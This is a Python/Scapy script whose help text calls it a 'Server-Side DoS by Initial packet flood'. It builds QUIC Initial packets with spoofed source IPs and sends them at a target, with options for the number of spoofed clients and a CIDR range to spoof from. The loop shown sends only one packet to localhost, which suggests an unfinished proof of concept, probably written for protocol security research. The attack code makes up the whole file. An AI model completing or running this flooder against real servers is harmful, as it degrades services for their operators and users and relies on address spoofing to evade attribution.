from scapy.all import IP, UDP, send
from scapy.layers.inet6 import IPv6
from scapy.packet import Raw
from frames import CryptoFrame, PaddingFrame, PingFrame

from packets import QUIC
from transport_ext import QUIC_Ext_Transport
from varint import VarInt
from scapy.layers.tls.crypto.hkdf import TLS13_HKDF
import time

import argparse
import logging
import re
from ipaddress import IPv4Network

# I know this could be shorter, but the verbosity is intended.
# The first group give the network base IP, the second the network subnet.
# Remember, round brackets define a group.
#CIDR_REGEX = "^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\/([0-9]|[1-2][0-9]|3[0-2])$"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Server-Side DoS by Initial packet flood'
    )
    parser.add_argument(
        '-n',
        '--nclient',
        type=int,
        nargs=1,
        default=100,
        help='number of spoofed client'
    )
    parser.add_argument(
        '-sport',
        "--src-port",
        type=int,
        help="source port",
    )
    parser.add_argument(
        '-dport',
        "--dst-port",
        type=int,
        default=443,
        help="destination port (defaults to 443)",
    )
    parser.add_argument(
        '-net',
        "--network",
        type=str,
        #required=True,
        default="192.168.0.0/24",
        help="network to use to spoof IPs. Use CIDR notation i.e. 192.168.0.0/24",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="increase logging verbosity"
    )
    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )
    
    #network_cidr = re.match(CIDR_REGEX, args.network)
    
    #if network_cidr is None:
    #    logging.error("Invalid network parameter used, use CIDR notation for network argument")
    #    raise SystemExit()
    
    #network_address = network_cidr.group(1)
    #subnet_bits = network_cidr.group(2)
    
    network = IPv4Network(args.network)
    
    logging.info(f"network: {network.network_address}")
    logging.info(f"subnet: {network.netmask}")

    for x in range(50,51):
        src_ip = '127.0.0.1' # spoofed source IP address
        dst_ip = '127.0.0.1' # destination IP address
        src_ip = '::1'
        dst_ip = '::1'
        src_port = 10000 # source port
        dst_port = 60000 # destination port
        
        DCID = bytes.fromhex("4949b5218e99c022")
        SCID = bytes.fromhex("78643036af1314e2")

        ip_packet = IPv6(src=src_ip, dst=dst_ip)
        udp_packet = UDP(sport=src_port, dport=dst_port)
        
        quic_packet = QUIC.initial(DCID,SCID)

        spoofed_packet = ip_packet / udp_packet / quic_packet
        
        send(spoofed_packet)
        #time.sleep(0.01)
    
